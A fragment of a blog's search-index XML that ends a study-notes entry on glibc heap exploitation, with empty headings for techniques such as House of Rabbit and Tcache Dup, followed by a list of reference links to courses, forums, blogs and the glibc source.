id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h3 id="Poison-Null-Byte"><a href="#Poison-Null-Byte" class="headerlink" title="Poison Null Byte"></a>Poison Null Byte</h3><h3 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h3><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><ul><li><p><a href="https://www.udemy.com/">Udemy</a></p><ul><li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-1/">Linux Heap Exploitation - Part 1</a></li><li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-2/">Linux Heap Exploitation - Part 2</a></li><li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-3/">Linux Heap Exploitation - Part 3</a></li></ul></li><li><p>source code</p><ul><li><a href="https://www.gnu.org/software/libc/">glibc code</a></li></ul></li><li><p><a href="www.52pojie.cn">吾爱破解</a></p><ul><li><a href="https://www.52pojie.cn/home.php?mod=space&uid=1573412&do=thread&view=me&from=space">呆毛王与咖喱棒</a></li><li></li></ul></li><li><p>self blog</p><ul><li><a href="https://hack1s.fun/">RIVER LI</a></li></ul></li><li><p>github blog</p><ul><li> <a href="https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">知世-glbic内存管理学习笔记 </a></li></ul></li><li><p><a href="https://bbs.pediy.com/">看雪论坛</a></p><ul><li><a href="https://bbs.pediy.com/thread-262424.htm#msg_header_h2_3">Largebin attack总结</a></li></ul></li><li><p><a href="https://blog.csdn.net/">CSDN</a></p><ul><li><a href="https://blog.csdn.net/qq_41202237/category_10328044.html">hollk-堆溢出</a></li><li></li></ul></li><li><p><a href="https://www.cnblogs.com/">博客园</a></p><ul><li><a href="https://www.cnblogs.com/luoleqi/p/11801400.html">Pwnki-Linux堆的一些基础知识</a></li><li><a href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">Pwnki-glibc 2.31 malloc与free 源码分析</a></li></ul></li><li><p>文档</p><ul><li><a href="attachment%5Creport%5Cglibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">华庭师傅 - glibc内存管理ptmalloc源代码分析</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>glibc source code</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
